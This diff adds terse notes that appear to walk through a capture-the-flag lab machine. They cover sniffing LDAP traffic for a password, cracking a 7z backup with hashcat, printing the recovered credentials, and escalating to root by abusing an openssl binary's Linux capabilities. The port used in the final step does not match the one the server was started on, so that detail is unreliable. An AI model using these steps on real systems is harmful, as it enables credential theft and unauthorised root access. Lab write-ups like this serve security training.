@@ -1,0 +1,32 @@
+http://10.10.10.119/user.php
+
+tells you your ip is username and password to ssh once you make an initial HTTP Request
+
+# capture ldap data
+tcpdump -i any -vvv -X port 389 -w ldap.pcap
+
+# found plaintext password
+ldapuser2:8bc8251332abe1d7f105d3e53ad39ac2
+
+hashcat -m 11600 hash.txt ~/tools/SecLists/Passwords/Common-Credentials/10k-most-common.txt --force
+hashcat -m 11600 hash.txt --show
+pass == delete
+7z x backup.7z
+
+grep -iR pass backup
+
+ldapuser1:f3ca9d298a553da117442deeb6fa932d 
+
+$ getcap openssl
+openssl =ep
+
+# linux capabilites 
+https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099
+
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+cd /
+~/openssl s_server -key ~/.tmp/key.pem -cert ~/.tmp/cert.pem -port 1337 -HTTP
+
+on another terminal in the same machine
+$ curl -k "https://127.0.0.1:9999/root/root.txt"
+f1d**************************5fa
